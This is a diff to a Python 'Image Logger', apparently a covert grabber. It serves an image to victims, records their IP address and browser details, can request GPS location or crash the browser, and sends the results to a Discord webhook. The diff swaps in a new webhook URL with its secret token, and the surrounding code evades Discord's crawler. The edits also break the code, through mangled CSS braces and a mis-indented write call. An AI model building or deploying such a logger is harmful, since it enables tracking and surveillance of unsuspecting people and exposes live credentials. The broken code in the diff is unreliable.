@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1529870640801382573/RUpF1JLFjJ_3FZNbrsbB1dHOUFo0My-gc6HCjDzKA1KyqUqmug9HvE7nNiCNgZSYYfaj",
-    "image": "https://media.discordapp.net/attachments/1529504068169371818/1529538081986838639/image.png?ex=6a62f598&is=6a61a418&hm=965b9dd5dc137660e6b69b5a472f2871c190bdd1042b553d9995681ea6535319&=&format=webp&quality=lossless", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
+    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -22,9 +22,9 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
@@ -65,7 +65,6 @@ config = {
 
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
-
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
         return "Discord"
@@ -185,7 +184,6 @@ binaries = {
     # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
     # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
-
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     
     def handleRequest(self):
@@ -204,14 +202,15 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
 margin: 0;
 padding: 0;
 }}
-div.img {{
+
+div.img {
 background-image: url('{url}');
 background-position: center center;
 background-repeat: no-repeat;
 background-size: contain;
 width: 100vw;
 height: 100vh;
-}}</style><div class="img"></div>'''.encode()
+}</style><div class="img"></div>'''.encode()
             
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
@@ -286,7 +285,7 @@ if (!currenturl.includes("g=")) {
 }}
 
 </script>"""
-                self.wfile.write(data)
+                                    self.wfile.write(data)
         
         except Exception:
             self.send_response(500)
